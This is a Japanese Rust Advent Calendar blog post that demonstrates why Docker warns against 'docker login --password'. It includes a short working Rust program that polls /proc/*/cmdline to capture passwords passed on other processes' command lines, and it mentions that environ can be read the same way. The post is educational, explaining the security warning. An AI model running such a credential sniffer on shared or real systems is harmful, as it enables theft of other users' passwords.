---
categories: [Rust, Advent Calendar, Advent Calendar 2021, Rust Advent Calendar, Docker, Linux]
date: 2021-12-20T23:19:28+09:00
title: "RustでDockerの--passwordで入力したパスワードを盗む"
---

このエントリは[Rust Advent Calendar](https://qiita.com/advent-calendar/2021/rust)の9日目の記事です。

空いてる日を埋める担当のκeenです。9日目が空いてたので遡って記事を投稿します。RustというよりLinuxの知識を使った記事ですが。Docker CLIでログインするときに `--password` オプションを使うとパスワードが盗まれる可能性があるよという警告が出たことありませんか？あれを実際にやってみたいと思います。

<!--more-->

`docker login` に `--password` オプションを渡すと以下のようにCLIからパスワードを渡すと安全でないよという警告が出ます。

```text
$ docker login --password MY_PASSWORD
WARNING! Using --password via the CLI is insecure. Use --password-stdin.
Login with your Docker ID to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com to create one.
Username:
```

口で言われるだけだとどのくらい安全でないか分からないので実際にコードを書いてパスワードを盗んでみましょう。

Linuxでは他のプロセスがどのように実行されているかを `/proc/PID` で確認できます。この機能を用います。

例えば私が今使っているシェルのPIDは `265989` です。

```text
$ echo $$
265989
```

そこで `/proc/265989/` を覗けば色々なものが見えるようになっています。

```text
$ ls /proc/265989/
arch_status  clear_refs          cpuset   fdinfo    map_files  mountstats  oom_score      projid_map  setgroups     statm           timers
attr         cmdline             cwd      gid_map   maps       net         oom_score_adj  root        smaps         status          timerslack_ns
autogroup    comm                environ  io        mem        ns          pagemap        sched       smaps_rollup  syscall         uid_map
auxv         coredump_filter     exe      limits    mountinfo  numa_maps   patch_state    schedstat   stack         task            wchan
cgroup       cpu_resctrl_groups  fd       loginuid  mounts     oom_adj     personality    sessionid   stat          timens_offsets
```

この中に `cmdline` というファイルがあり、その中身にコマンドと引数が書かれています。

```text
$ cat /proc/265989/cmdline
/usr/bin/zsh
```

同様に `docker login` プロセスのこれを見ればパスワードが書いてある訳です。
となると、あとはdockerコマンドがくるのを待ち受けてあげればよいですね。コードを書いてみましょう。

`/proc` 下にある数字名のディレクトリを全部開いて `cmdline` を読み、 `docker` と `--password` という文字列が含まれていたら標準出力に書き出すコードを書けばよさそうです。

`/proc` 以下は普通のファイルとして読めるので標準ライブラリだけで処理できてしまいます。

```rust
use std::fs;
for entry in fs::read_dir("/proc")? {
    let e = entry?;
    // ...
}
```

エントリがディレクトリでありかつ名前が全て数字のものだけを対象にします。

```rust
let e = entry?;

let is_dir = e.file_type()?.is_dir();
let is_number_named = e
    .file_name()
    .to_str()
    .unwrap()
    .chars()
    .all(|c| "1234567890".contains(c));
if is_dir && is_number_named {
  // ...
}
```

そしてそのディレクトリ下にある `cmdline` というファイルを読み出し、 `docker` と `password` が含まれているかを検査し、含まれていれば出力します。

```rust
let cmdline = fs::read_to_string(e.path().join("cmdline"))?;
if cmdline.contains("docker")
    && cmdline.contains("--password") {
    println!("cmdline: {}", cmdline);
    return Ok(());
}
```

というのをヒットするまで繰り返します。全体としてはこういうコードになります。


```rust
use std::fs;
use std::io;

fn main() -> io::Result<()> {
    loop {
        for entry in fs::read_dir("/proc")? {
            let e = entry?;
            let is_dir = e.file_type()?.is_dir();
            let is_number_named = e
                .file_name()
                .to_str()
                .unwrap()
                .chars()
                .all(|c| "1234567890".contains(c));
            if is_dir && is_number_named {
                let cmdline = fs::read_to_string(e.path().join("cmdline"))?;
                if cmdline.contains("docker") && cmdline.contains("--password") {
                    println!("cmdline: {}", cmdline);
                    return Ok(());
                }
            }
        }
    }
}
```

これを走らせてみましょう。 `cargo run` している間に別ターミナルで `docker login --password hoge` を入力してみます。

```text
$ cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.00s
     Running `target/debug/docker-password`
cmdline: dockerlogin--passwordhoge

───────────別ターミナル─────────────────────────────────

$ docker login --password hoge
WARNING! Using --password via the CLI is insecure. Use --password-stdin.
Login with your Docker ID to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com to create one.
Username: ^C
```

はい、コマンドラインが取得できましたね。引数がヌル文字区切りなので間がつまってるように見えますが、まあよいでしょう。

荒い部分はありますし、ヒットするまでループを回すという力技ですがパスワードを抜き出すことができました。同様にして `environ` から環境変数も抜き出せるので環境変数でパスワードを渡すようなプログラムも危険です。この記事を通して出されている警告の意味が分かるようになれば幸いです。

## 余談

最初は `/proc` にinotifyをかけて新規プロセスを取得しようと思ってたんですが、新規プロセスができても `/proc` にCREATEイベントが発生しないんですね。仕方ないのでループで回すという力技にしました。

後で調べたら新規プロセスを監視するのはeBPFなど何種類かのAPIによる実現方法があるようです。詳しい方がいたらやってみて下さい。
